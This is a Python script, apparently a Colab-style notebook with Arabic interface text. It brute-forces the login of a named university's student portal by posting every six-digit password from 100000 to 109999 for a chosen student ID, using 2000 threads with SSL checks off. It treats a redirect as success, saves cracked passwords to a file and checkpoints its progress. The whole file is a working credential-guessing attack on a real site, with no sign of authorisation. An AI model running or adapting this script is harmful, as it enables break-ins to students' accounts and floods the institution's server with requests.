import requests
import threading
import time
from datetime import datetime
from queue import Queue
import urllib3
import json
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import psutil

# محاولة استيراد GPUtil
try:
    import GPUtil
    GPU_AVAILABLE = True
except ImportError:
    GPU_AVAILABLE = False
    print("⚠️ GPUtil غير متوفرة، سيتم استخدام CPU فقط")

# إلغاء تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================
# إعدادات - أقصى استغلال لكل الموارد
# ==========================
BASE_URL = "https://eng.modern-academy.edu.eg/university/student/login.aspx"
SUCCESS_FILE = "found_passwords.txt"
CHECKPOINT_FILE = "checkpoint.json"

# تحديد عدد الـ threads بناءً على الموارد المتاحة
CPU_COUNT = psutil.cpu_count(logical=True)
TOTAL_RAM = psutil.virtual_memory().total / 1e9

if GPU_AVAILABLE:
    try:
        gpus = GPUtil.getGPUs()
        if gpus:
            GPU_COUNT = len(gpus)
            GPU_MEMORY = gpus[0].memoryTotal / 1024  # تحويل إلى GB
            GPU_NAME = gpus[0].name
            print(f"✅ تم اكتشاف {GPU_COUNT} GPU {GPU_NAME} بذاكرة {GPU_MEMORY:.1f} GB")
        else:
            GPU_COUNT = 0
            GPU_MEMORY = 0
            GPU_NAME = "غير متوفر"
    except:
        GPU_COUNT = 0
        GPU_MEMORY = 0
        GPU_NAME = "غير متوفر"
else:
    GPU_COUNT = 0
    GPU_MEMORY = 0
    GPU_NAME = "غير متوفر"

# مع GPU Tesla T4، نستخدم 2000 thread
NUM_THREADS = 2000

print(f"📊 CPU cores: {CPU_COUNT} | RAM: {TOTAL_RAM:.1f} GB | GPU: {GPU_NAME} | Threads: {NUM_THREADS}")

# نطاق البحث
START_PASSWORD = 100000
END_PASSWORD = 109999

# ViewState
VIEWSTATE = "/wEPDwUILTQ5MDEwMjJkZGW+XxHgaTLNHTGZl9W0amOxF73yJ4Co+eVqmdlQH50+"
VIEWSTATEGENERATOR = "B71B77C3"

# إعدادات متقدمة
MAX_RETRIES = 3
TIMEOUT = 2
DELAY = 0.0005  # 0.5ms فقط

# ==========================
# ألوان للطباعة
# ==========================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    END = '\033[0m'
    BOLD = '\033[1m'

# ==========================
# كلاس العرض المباشر - تحديث كل 100 محاولة
# ==========================
class LiveDisplay:
    def __init__(self):
        self.last_update = 0
        self.lock = threading.Lock()
        self.update_counter = 0
        self.update_every = 100  # تحديث كل 100 محاولة
        
    def clear_screen(self):
        """مسح الشاشة"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_header(self, cracker):
        """طباعة الهيدر"""
        print(f"{Colors.BOLD}{Colors.CYAN}{'='*120}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}🚀 برنامج البحث عن كلمة السر - تحديث كل 100 محاولة 🚀{Colors.END}".center(120))
        print(f"{Colors.BOLD}{Colors.CYAN}{'='*120}{Colors.END}")
        print(f"{Colors.YELLOW}📌 الطالب: {cracker.student_id}{Colors.END} | "
              f"{Colors.YELLOW}📊 النطاق: {START_PASSWORD} - {END_PASSWORD}{Colors.END} | "
              f"{Colors.YELLOW}⚡ Threads: {NUM_THREADS:,}{Colors.END}")
        print(f"{Colors.CYAN}{'-'*120}{Colors.END}")
    
    def print_progress_bar(self, progress, width=60):
        """طباعة شريط التقدم"""
        filled = int(width * progress / 100)
        bar = '█' * filled + '░' * (width - filled)
        return f"[{bar}] {progress:.1f}%"
    
    def get_resource_stats(self):
        """الحصول على إحصائيات الموارد"""
        stats = {
            'cpu_percent': psutil.cpu_percent(interval=0.1, percpu=True),
            'cpu_avg': psutil.cpu_percent(interval=0.1),
            'memory': psutil.virtual_memory(),
            'gpu_load': 0,
            'gpu_memory': 0,
            'gpu_temp': 0,
            'gpu_count': 0
        }
        
        if GPU_AVAILABLE:
            try:
                gpus = GPUtil.getGPUs()
                if gpus:
                    stats['gpu_count'] = len(gpus)
                    stats['gpu_load'] = sum(gpu.load for gpu in gpus) / len(gpus) * 100
                    stats['gpu_memory'] = sum(gpu.memoryUtil for gpu in gpus) / len(gpus) * 100
                    stats['gpu_temp'] = sum(gpu.temperature for gpu in gpus) / len(gpus)
            except:
                pass
        
        return stats
    
    def should_update(self):
        """تحديد ما إذا كان يجب التحديث"""
        self.update_counter += 1
        if self.update_counter >= self.update_every:
            self.update_counter = 0
            return True
        return False
    
    def print_status(self, cracker, force=False):
        """طباعة الحالة المباشرة"""
        if not force and not self.should_update():
            return
            
        with self.lock:
            self.clear_screen()
            self.print_header(cracker)
            
            # إحصائيات الموارد
            stats = self.get_resource_stats()
            
            # الوقت المنقضي
            elapsed = time.time() - cracker.start_time
            elapsed_str = f"{int(elapsed//60)}:{int(elapsed%60):02d}"
            
            # التقدم
            progress = cracker.get_progress()
            remaining = cracker.get_remaining()
            
            # السرعة
            rps = cracker.requests_per_second
            
            # الوقت المتبقي المتوقع
            if rps > 0 and remaining > 0:
                eta = remaining / rps
                eta_str = f"{int(eta//60)}:{int(eta%60):02d}"
            else:
                eta_str = "--:--"
            
            # شريط التقدم
            print(f"\n{Colors.BOLD}{self.print_progress_bar(progress)}{Colors.END}\n")
            
            # إحصائيات رئيسية
            print(f"{Colors.GREEN}✅ النجاح: {cracker.successful_attempts}{Colors.END} | "
                  f"{Colors.RED}❌ الفشل: {cracker.failed_attempts:,}{Colors.END} | "
                  f"{Colors.YELLOW}📦 المتبقي: {remaining:,}{Colors.END}")
            
            print(f"{Colors.CYAN}⏱️ الوقت: {elapsed_str} | "
                  f"⚡ السرعة: {rps:.0f}/ثانية | "
                  f"🚀 الذروة: {cracker.peak_speed:.0f}/ثانية | "
                  f"⏳ المتبقي: {eta_str}{Colors.END}")
            
            # CPU usage per core
            print(f"\n{Colors.MAGENTA}💻 CPU ({len(stats['cpu_percent'])} cores):{Colors.END}")
            cpu_bars = []
            for i, cpu in enumerate(stats['cpu_percent']):
                bar_len = 20
                filled = int(bar_len * cpu / 100)
                bar = '█' * filled + '░' * (bar_len - filled)
                cpu_bars.append(f"Core {i:2d}: [{bar}] {cpu:3.0f}%")
            
            # عرض الـ CPUs في صفوف
            for i in range(0, len(cpu_bars), 2):
                if i + 1 < len(cpu_bars):
                    print(f"   {cpu_bars[i]:<45} {cpu_bars[i+1]}")
                else:
                    print(f"   {cpu_bars[i]}")
            
            # RAM
            memory = stats['memory']
            ram_bar_len = 40
            ram_filled = int(ram_bar_len * memory.percent / 100)
            ram_bar = '█' * ram_filled + '░' * (ram_bar_len - ram_filled)
            print(f"\n{Colors.MAGENTA}📊 RAM:{Colors.END} [{ram_bar}] {memory.percent:.1f}% ({memory.used/1e9:.1f}/{memory.total/1e9:.1f} GB)")
            
            # GPU if available
            if GPU_AVAILABLE and stats['gpu_count'] > 0:
                print(f"\n{Colors.MAGENTA}🎮 GPU ({GPU_NAME}):{Colors.END}")
                gpu_bar_len = 40
                gpu_filled = int(gpu_bar_len * stats['gpu_load'] / 100)
                gpu_bar = '█' * gpu_filled + '░' * (gpu_bar_len - gpu_filled)
                
                vram_bar_len = 40
                vram_filled = int(vram_bar_len * stats['gpu_memory'] / 100)
                vram_bar = '█' * vram_filled + '░' * (vram_bar_len - vram_filled)
                
                print(f"   GPU Load: [{gpu_bar}] {stats['gpu_load']:.1f}%")
                print(f"   VRAM Use: [{vram_bar}] {stats['gpu_memory']:.1f}% ({stats['gpu_memory']*GPU_MEMORY/100:.1f}/{GPU_MEMORY:.1f} GB)")
                if stats['gpu_temp'] > 0:
                    print(f"   🌡️ Temperature: {stats['gpu_temp']:.0f}°C")
            
            # آخر 5 محاولات ناجحة
            if cracker.recent_successes:
                print(f"\n{Colors.GREEN}✅ آخر المحاولات الناجحة:{Colors.END}")
                for pwd in cracker.recent_successes[-5:]:
                    print(f"   {pwd}")
            
            print(f"\n{Colors.CYAN}{'-'*120}{Colors.END}")
            print(f"{Colors.BOLD}🔍 يتم التحديث كل 100 محاولة - اضغط Ctrl+C للإيقاف والحفظ{Colors.END}")
    
    def print_found(self, cracker, password, location):
        """طباعة عند العثور على كلمة السر"""
        self.clear_screen()
        print(f"{Colors.GREEN}{'🎉'*60}{Colors.END}")
        print(f"{Colors.GREEN}✅✅✅ تم العثور على كلمة السر! ✅✅✅{Colors.END}".center(120))
        print(f"{Colors.GREEN}{'🎉'*60}{Colors.END}")
        print(f"\n{Colors.BOLD}{Colors.YELLOW}{'='*120}{Colors.END}")
        print(f"{Colors.BOLD}📌 الطالب: {cracker.student_id}{Colors.END}".center(120))
        print(f"{Colors.BOLD}🔑 كلمة السر: {password}{Colors.END}".center(120))
        print(f"{Colors.BOLD}📍 التحويل إلى: {location}{Colors.END}".center(120))
        print(f"{Colors.BOLD}{Colors.YELLOW}{'='*120}{Colors.END}")
        
        elapsed = time.time() - cracker.start_time
        total_attempts = cracker.successful_attempts + cracker.failed_attempts
        
        print(f"\n{Colors.CYAN}⏱️ الوقت: {int(elapsed//60)}:{int(elapsed%60):02d}")
        print(f"⚡ متوسط السرعة: {total_attempts/elapsed:.0f} طلب/ثانية")
        print(f"🚀 أقصى سرعة: {cracker.peak_speed:.0f} طلب/ثانية")
        print(f"📊 إجمالي المحاولات: {total_attempts:,}{Colors.END}")

# ==========================
# كلاس مدير المهام
# ==========================
class GPUCracker:
    def __init__(self, student_id):
        self.student_id = student_id
        self.found = threading.Event()
        self.lock = threading.Lock()
        self.stats_lock = threading.Lock()
        self.display = LiveDisplay()
        
        # بيانات التقدم
        self.checked = set()
        self.failed_attempts = 0
        self.successful_attempts = 0
        self.found_password = None
        self.found_location = None
        self.recent_successes = []
        self.start_time = time.time()
        self.last_save_time = time.time()
        
        # إحصائيات الأداء
        self.requests_per_second = 0
        self.last_stats_time = time.time()
        self.stats_counter = 0
        self.peak_speed = 0
        
        # تحميل checkpoint
        self.load_checkpoint()
    
    def load_checkpoint(self):
        """تحميل آخر تقدم"""
        try:
            if os.path.exists(CHECKPOINT_FILE):
                with open(CHECKPOINT_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    
                    if data.get('student_id') == self.student_id:
                        self.checked = set(data.get('checked', []))
                        self.successful_attempts = data.get('successful', 0)
                        self.failed_attempts = data.get('failed', 0)
                        
                        print(f"\n{Colors.GREEN}✅ استئناف العمل:{Colors.END}")
                        print(f"   📊 تم فحص {len(self.checked):,} كلمة سر")
                        print(f"   ✅ نجاح: {self.successful_attempts}")
                        print(f"   ❌ فشل: {self.failed_attempts:,}")
                        time.sleep(2)
                        
        except Exception as e:
            pass
    
    def save_checkpoint(self, force=False):
        """حفظ التقدم"""
        if not force and time.time() - self.last_save_time < 30:
            return
        
        with self.lock:
            try:
                checked_list = list(self.checked)[-10000:] if len(self.checked) > 10000 else list(self.checked)
                
                data = {
                    'student_id': self.student_id,
                    'checked': checked_list,
                    'successful': self.successful_attempts,
                    'failed': self.failed_attempts,
                    'found_password': self.found_password,
                    'timestamp': datetime.now().isoformat()
                }
                
                with open(CHECKPOINT_FILE, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2)
                
                self.last_save_time = time.time()
                
            except Exception as e:
                pass
    
    def is_checked(self, password):
        """التحقق السريع"""
        return str(password) in self.checked
    
    def mark_checked(self, password, success=False, location=''):
        """تسجيل فحص كلمة السر"""
        with self.lock:
            self.checked.add(str(password))
            
            if success:
                self.successful_attempts += 1
                self.recent_successes.append(password)
                if len(self.recent_successes) > 10:
                    self.recent_successes.pop(0)
                    
                if not self.found_password:
                    self.found_password = password
                    self.found_location = location
                    self.found.set()
                    self.save_checkpoint(force=True)
                    self.display.print_found(self, password, location)
            else:
                self.failed_attempts += 1
            
            self.stats_counter += 1
    
    def update_stats(self):
        """تحديث إحصائيات السرعة"""
        with self.stats_lock:
            current = time.time()
            diff = current - self.last_stats_time
            
            if diff >= 1:
                self.requests_per_second = self.stats_counter / diff
                self.peak_speed = max(self.peak_speed, self.requests_per_second)
                self.stats_counter = 0
                self.last_stats_time = current
            
            return self.requests_per_second
    
    def get_progress(self):
        """نسبة التقدم"""
        total = END_PASSWORD - START_PASSWORD + 1
        return (len(self.checked) / total) * 100
    
    def get_remaining(self):
        """المتبقي للفحص"""
        total = END_PASSWORD - START_PASSWORD + 1
        return total - len(self.checked)

# ==========================
# worker مع معالجة دفعات
# ==========================
def batch_worker(cracker, password_queue, thread_id):
    """معالج مع استغلال كل الموارد"""
    
    local_count = 0
    session = requests.Session()
    
    while not cracker.found.is_set():
        try:
            password = password_queue.get_nowait()
        except:
            break
        
        if cracker.is_checked(password):
            password_queue.task_done()
            continue
        
        # فحص سريع
        try:
            data = {
                "__EVENTTARGET": "ctl00$Main$btnLogin",
                "__EVENTARGUMENT": "",
                "__VIEWSTATE": VIEWSTATE,
                "__VIEWSTATEGENERATOR": VIEWSTATEGENERATOR,
                "ctl00$Main$txtID": cracker.student_id,
                "ctl00$Main$txtPassword": str(password)
            }
            
            response = session.post(
                BASE_URL,
                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"},
                data=data,
                allow_redirects=False,
                verify=False,
                timeout=TIMEOUT
            )
            
            success = response.status_code == 302
            
            if success:
                location = response.headers.get('Location', '')
                cracker.mark_checked(password, success=True, location=location)
                password_queue.task_done()
                break
            else:
                cracker.mark_checked(password, success=False)
            
        except Exception as e:
            cracker.mark_checked(password, success=False)
        
        local_count += 1
        password_queue.task_done()
        
        # تحديث السرعة وعرض التقدم
        if local_count % 10 == 0:
            cracker.update_stats()
        
        # تحديث العرض كل 100 محاولة
        cracker.display.print_status(cracker)

# ==========================
# الدالة الرئيسية
# ==========================
def main():
    # مسح الشاشة
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # شاشة البداية
    print(f"{Colors.BOLD}{Colors.HEADER}{'='*120}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.HEADER}🚀 برنامج البحث عن كلمة السر - تحديث كل 100 محاولة 🚀{Colors.END}".center(120))
    print(f"{Colors.BOLD}{Colors.HEADER}{'='*120}{Colors.END}")
    
    # عرض الموارد المتاحة
    cpu_count = psutil.cpu_count(logical=True)
    memory = psutil.virtual_memory()
    
    print(f"\n{Colors.CYAN}💻 الموارد المتاحة:{Colors.END}")
    print(f"   🖥️ CPU: {cpu_count} core")
    print(f"   📊 RAM: {memory.total/1e9:.1f} GB")
    
    if GPU_AVAILABLE:
        try:
            gpus = GPUtil.getGPUs()
            if gpus:
                for i, gpu in enumerate(gpus):
                    print(f"   🎮 GPU {i+1}: {gpu.name} | {gpu.memoryTotal:.0f} MB | {gpu.temperature:.0f}°C")
            else:
                print(f"   🎮 GPU: غير متصل")
        except:
            print(f"   🎮 GPU: غير متوفر")
    else:
        print(f"   🎮 GPU: غير متوفر")
    
    print(f"\n{Colors.GREEN}⚡ الإعدادات:{Colors.END}")
    print(f"   📌 Threads: {Colors.YELLOW}{NUM_THREADS:,}{Colors.END}")
    print(f"   📊 النطاق: {START_PASSWORD} - {END_PASSWORD}")
    print(f"   ⏱️ Timeout: {TIMEOUT} ثانية")
    print(f"   ⚡ Delay: {DELAY*1000:.2f} ms")
    print(f"   🔄 تحديث العرض: كل 100 محاولة")
    
    # إدخال رقم الطالب
    student_id = input(f"\n{Colors.YELLOW}📌 أدخل رقم الطالب: {Colors.END}").strip()
    
    if not student_id:
        print(f"{Colors.RED}❌ رقم الطالب مطلوب!{Colors.END}")
        return
    
    # إنشاء الكracker
    cracker = GPUCracker(student_id)
    
    if cracker.found.is_set():
        print(f"\n{Colors.GREEN}✅ تم العثور على كلمة السر مسبقاً: {cracker.found_password}{Colors.END}")
        return
    
    print(f"\n{Colors.GREEN}🔍 البحث عن كلمة السر للطالب: {student_id}{Colors.END}")
    
    # إنشاء queue
    password_queue = Queue()
    total_to_check = 0
    
    for p in range(START_PASSWORD, END_PASSWORD + 1):
        if not cracker.is_checked(p):
            password_queue.put(p)
            total_to_check += 1
    
    print(f"{Colors.BLUE}📊 للفحص: {total_to_check:,} كلمة سر{Colors.END}")
    print(f"{Colors.CYAN}{'='*120}{Colors.END}\n")
    
    # وقت البدء
    time.sleep(2)
    
    # تشغيل الـ threads
    num_workers = min(NUM_THREADS, total_to_check)
    
    with ThreadPoolExecutor(max_workers=num_workers) as executor:
        futures = []
        for i in range(num_workers):
            future = executor.submit(batch_worker, cracker, password_queue, i+1)
            futures.append(future)
        
        # مراقبة التقدم
        try:
            while not cracker.found.is_set() and any(not f.done() for f in futures):
                time.sleep(0.1)  # تحديث سريع للعداد
                
                # حفظ checkpoint كل دقيقة
                if time.time() - cracker.last_save_time > 60:
                    cracker.save_checkpoint()
                    
        except KeyboardInterrupt:
            print(f"\n\n{Colors.YELLOW}⚠️ تم الإيقاف بواسطة المستخدم{Colors.END}")
            cracker.save_checkpoint(force=True)
            print(f"{Colors.GREEN}💾 تم حفظ التقدم{Colors.END}")
            
            # إنهاء الـ futures
            for future in futures:
                future.cancel()
            
            sys.exit(0)
    
    # إذا لم يتم العثور على كلمة السر
    if not cracker.found_password:
        cracker.display.clear_screen()
        print(f"{Colors.RED}{'='*120}{Colors.END}")
        print(f"{Colors.RED}❌ لم يتم العثور على كلمة السر في النطاق المحدد{Colors.END}".center(120))
        print(f"{Colors.RED}{'='*120}{Colors.END}")
        
        elapsed = time.time() - cracker.start_time
        total_attempts = cracker.successful_attempts + cracker.failed_attempts
        
        print(f"\n{Colors.CYAN}📊 إحصائيات نهائية:{Colors.END}")
        print(f"   ⏱️ الوقت: {int(elapsed//60)}:{int(elapsed%60):02d}")
        print(f"   📊 إجمالي المحاولات: {total_attempts:,}")
        print(f"   ⚡ متوسط السرعة: {total_attempts/elapsed:.0f} طلب/ثانية")
        print(f"   🚀 أقصى سرعة: {cracker.peak_speed:.0f} طلب/ثانية")
        print(f"   ✅ نجاح: {cracker.successful_attempts}")
        print(f"   ❌ فشل: {cracker.failed_attempts:,}")

# تثبيت المكتبات المطلوبة
!pip install psutil gputil --quiet

if __name__ == "__main__":
    main()